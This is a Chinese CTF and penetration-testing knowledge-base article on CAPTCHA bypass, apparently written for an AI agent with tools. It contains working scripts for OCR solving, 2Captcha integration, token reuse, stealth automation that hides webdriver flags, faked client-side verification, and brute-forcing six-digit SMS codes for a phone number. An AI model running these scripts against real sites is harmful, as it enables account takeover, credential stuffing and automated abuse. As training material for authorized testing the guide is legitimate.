---
id: "ctf-website/01-recon/captcha-bypass"
title: "验证码绕过技术与自动化"
title_en: "CAPTCHA Bypass Techniques and Automation"
summary: >
  系统讲解各类验证码（滑块、点选、图形、短信、无感）的识别方法与绕过策略，涵盖 OCR 识别、打码平台 API 集成、Token 重用、Playwright 自动化及客户端逻辑绕过等七大方法，用于渗透测试中突破人机验证防护。
summary_en: >
  A comprehensive guide to bypassing CAPTCHA protections including slider, click, image, SMS, and invisible challenges. Covers OCR recognition, captcha-solving API integration, token reuse, Playwright automation with stealth plugins, and client-side logic bypass techniques.
board: "ctf-website"
category: "01-recon"
signals: ["CAPTCHA", "验证码", "reCAPTCHA", "滑块验证", "OCR", "ddddocr", "Playwright", "打码平台"]
mcp_tools: ["http_probe", "kb_router", "toolbox_launch"]
keywords: ["captcha bypass", "验证码绕过", "recaptcha", "ddddocr", "2captcha", "playwright stealth", "滑块验证", "短信验证码绕过", "token重用"]
difficulty: "intermediate"
tags: ["captcha", "automation", "web-security", "recon", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---

# 验证码绕过技术与自动化

## 场景

目标站点使用 CAPTCHA 对人机交互、登录、注册、支付等关键操作进行防护。需要识别验证码类型，选择对应的绕过方案，实现自动化测试或批量操作。

## 输入信号

- `/captcha`, `/verify`, `/sms/send`, `/turnstile`, `/recaptcha` 等接口出现
- 登录/注册/下单/支付前置 CAPTCHA，但后端状态变化接口可单独调用
- 响应中有 `captcha_id`, `challenge`, `lot_number`, `pass_token`, `sitekey`
- 同一 token 在多个请求、多个账号或长时间窗口内仍然有效
- CAPTCHA 前端通过后，服务端只看 localStorage/cookie/隐藏字段

## 0. 绕过判定矩阵

| 类型 | 关键字段 | 优先打法 | 成功样本 | 失败样本 |
|------|----------|----------|----------|----------|
| 图片/OCR | `captcha_id`, image URL | 识别 + 重放窗口 | 同一答案多次通过 | 答案一次性绑定 session |
| 滑块/点选 | `challenge`, `validate` | 复用 token / 前端 Hook | token 可跨接口复用 | token 绑定轨迹和时间 |
| reCAPTCHA/Turnstile | `sitekey`, token | 测试 key / solver / token 生命周期 | token 被后端接受 | `timeout-or-duplicate` |
| 短信码 | phone, scene, code | 绑定关系/并发窗口 | A 码验证 B 账号 | code 绑定 phone+scene |
| 前端逻辑 | localStorage/cookie hidden field | 删除参数/伪造通过状态 | 不带 captcha 仍成功 | 服务端二次校验 |

## 验证码类型识别

| 类型 | 产品 | 特征 |
|------|------|------|
| 滑块验证 | 极验(Geetest)、阿里云、腾讯云 | 拖动拼图到缺口 |
| 点选验证 | 极验 v4、网易易盾 | 按顺序点击图中文字 |
| 图形验证码 | reCAPTCHA v2、hCaptcha | 选择包含某物体的图片 |
| 无感验证 | reCAPTCHA v3、Cloudflare Turnstile | 后台评分，无用户交互 |
| 短信验证 | — | 发送验证码到手机 |
| 自定义逻辑 | — | 数学题、旋转图片、语义理解 |

## 方法 1：OCR 识别图形验证码

```python
import ddddocr

ocr = ddddocr.DdddOcr()
with open('captcha.png', 'rb') as f:
    result = ocr.classification(f.read())
print(f"Captcha: {result}")
```

```python
# 预处理增强识别率
from PIL import Image, ImageFilter

img = Image.open('captcha.png')
# 灰度化
img = img.convert('L')
# 二值化
img = img.point(lambda x: 0 if x < 128 else 255)
# 去噪
img = img.filter(ImageFilter.MedianFilter(3))
img.save('clean.png')
```

## 方法 2：打码平台 API

```python
# 2Captcha / Anti-Captcha / Capsolver 通用模式
import requests, time

API_KEY = "your_key"
SITE_KEY = "target_site_key"
PAGE_URL = "https://target.com/login"

# 1. 创建任务
resp = requests.post("https://api.2captcha.com/createTask", json={
    "clientKey": API_KEY,
    "task": {
        "type": "RecaptchaV2TaskProxyless",
        "websiteURL": PAGE_URL,
        "websiteKey": SITE_KEY
    }
})
task_id = resp.json()["taskId"]

# 2. 轮询结果
for _ in range(30):
    time.sleep(2)
    resp = requests.post("https://api.2captcha.com/getTaskResult", json={
        "clientKey": API_KEY, "taskId": task_id
    })
    if resp.json()["status"] == "ready":
        token = resp.json()["solution"]["gRecaptchaResponse"]
        break

# 3. 提交 token
requests.post("https://target.com/login", data={
    "g-recaptcha-response": token,
    "username": "admin", "password": "pass"
})
```

## 方法 3：Token 重用

```python
# reCAPTCHA token 可跨请求重用（同一 sitekey + 同一域名）
# 手动完成一次验证 → 抓取 token → 脚本复用
TOKEN = "03AGdBq24..."  # 从浏览器 DevTools 抓取

for i in range(100):
    resp = requests.post("https://target.com/submit", data={
        "g-recaptcha-response": TOKEN,
        "data": f"payload_{i}"
    })
    # reCAPTCHA token 有效期约 2 分钟
```

## 方法 4：Playwright 自动化 + Stealth 插件

```python
from playwright.sync_api import sync_playwright
import playwright_stealth

with sync_playwright() as p:
    browser = p.chromium.launch(headless=False)
    context = browser.new_context()
    page = context.new_page()
    
    # Stealth 注入（隐藏自动化特征）
    playwright_stealth.inject(page)
    
    # 处理 reCAPTCHA（手动或通过打码平台）
    page.goto("https://target.com/login")
    # 等待手动解决 CAPTCHA，或集成 Capsolver 扩展
    
    page.fill("#username", "admin")
    page.fill("#password", "pass")
    page.click("#login")
```

## 方法 5：验证码逻辑绕过

### 5a. 客户端验证绕过

```javascript
// 常见：前端验证，后端不校验
// Burp Suite 抓包 → 删除 captcha 参数重放

// 或修改返回值为 true
Object.defineProperty(window, 'captchaVerified', {value: true})
```

### 5b. 验证结果缓存在前端

```javascript
// 一些系统把验证结果存在 localStorage
localStorage.setItem('captcha_token', 'bypass')
localStorage.setItem('verify_status', 'true')
```

### 5c. 验证码下发接口可重放

```python
# 同一个 captcha_id 反复提交
session = requests.Session()
# 第一次获取验证码
captcha = session.get("https://target.com/captcha?t=" + str(time.time()))
# 记录 captcha_id 和答案
# 之后用相同 captcha_id 提交任意次数
```

### 5d. CAPTCHA enforcement diff

```python
import json
import requests

def captcha_enforcement_matrix(base, action_path, payload):
    s = requests.Session()
    variants = [
        ("baseline", payload),
        ("no_captcha", {k: v for k, v in payload.items() if "captcha" not in k.lower()}),
        ("empty_captcha", {**payload, "captcha": "", "captcha_id": ""}),
        ("array_captcha", {**payload, "captcha": ["x"], "captcha_id": ["x"]}),
        ("reused_token", {**payload, "captcha_token": payload.get("captcha_token", "REUSE")}),
    ]
    rows = []
    for name, body in variants:
        r = s.post(base.rstrip("/") + action_path, json=body, timeout=8, allow_redirects=False)
        rows.append({
            "case": name,
            "status": r.status_code,
            "len": len(r.text),
            "body": r.text[:240],
            "set_cookie": r.headers.get("Set-Cookie", ""),
        })
    print(json.dumps(rows, ensure_ascii=False, indent=2))
```

### 5e. 固定验证码（开发/测试模式）

```bash
# 尝试测试密钥
sitekey: 6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI  # reCAPTCHA test key
# 使用测试 sitekey 时，任何 token="test" 都可通过
```

## 方法 6：短信验证码绕过

```python
# 6a. 验证码可枚举（4-6位数字）
for code in range(100000, 1000000):
    r = requests.post("https://target.com/verify_sms", data={
        "phone": "13800138000", "code": str(code)
    })
    if "success" in r.text:
        print(f"Found: {code}")
        break

# 6b. 验证码未绑定手机号
# 用 A 手机号获取的验证码，验证 B 手机号
requests.post("https://target.com/verify", data={
    "phone": "B", "code": code_from_A
})
```

## 方法 7：Cloudflare Turnstile 绕过

```bash
# Turnstile 是 Cloudflare 的无感验证替代品
# 与 reCAPTCHA 类似，使用 sitekey + token 模式

# 1. 确认 Turnstile
# 页面包含: <div class="cf-turnstile" data-sitekey="...">

# 2. 使用 Capsolver
# task type: "AntiTurnstileTaskProxyLess"

# 3. 或通过 Playwright 渲染
# Turnstile 比 reCAPTCHA 宽松，Stealth Playwright 可通过
```

## 攻击链

```
1. 识别 CAPTCHA 类型 → 查看页面源码 sitekey / div class
2. 测试客户端绕过 → Burp 重放删除 captcha 参数 → 看返回
3. 测试固定密钥 → reCAPTCHA test key / Turnstile test key
4. 打码平台 → 2Captcha/Anti-Captcha API 集成
5. Token 重用 → 手动验证一次，抓 token 复用
6. 自动化 → Playwright + Stealth + Capsolver 扩展
```

## 对抗点绕过检测

```python
# 检测自动化框架
# 修改 navigator.webdriver
page.evaluate("() => { Object.defineProperty(navigator, 'webdriver', {get: () => false}) }")

# 修改 Chrome Runtime 标志
page.evaluate("() => { delete window.chrome.runtime }")

# 伪造 plugins 和 mimeTypes
# playwright_stealth 已内置这些处理
```

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| HTTP 探测验证码端点 | `http_probe` | 探测 /captcha /verify 接口 |
| 按信号查知识库 | `kb_router` | 搜索 captcha bypass / recaptcha 技术文件 |
| 浏览器自动化 | `toolbox_launch` + Playwright | 启动浏览器进行交互式 CAPTCHA 处理 |

## Evidence

- `captcha_surface.json`: captcha 类型、sitekey/challenge/captcha_id、绑定的 action、token TTL。
- `captcha_enforcement_matrix.json`: baseline、删除参数、空值、数组值、重放 token 的响应差异。
- `solver_trace.har`: 获取 challenge、提交 token、业务 action 的完整请求顺序。
- 成功样本: 无验证码/旧 token/跨账号 token 仍能触发登录、注册、下单、支付或 flag。
- 失败样本: token 过期、绑定 session/phone/action、服务端返回 `timeout-or-duplicate` 或重置 challenge。
